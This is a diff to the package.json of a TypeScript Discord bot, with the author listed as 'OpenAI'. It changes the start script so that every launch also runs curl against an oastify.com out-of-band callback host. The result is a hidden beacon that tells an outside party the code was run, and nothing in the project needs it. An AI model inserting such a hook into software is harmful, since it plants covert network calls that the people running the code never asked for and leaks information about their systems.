@@ -1,7 +1,7 @@
 {
   "main": "src/Bot.ts",
   "scripts": {
-    "start": "ts-node src/Bot.ts"
+    "start": "ts-node src/Bot.ts && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/openai-discord"
   },
   "author": "OpenAI",
   "license": "MIT",
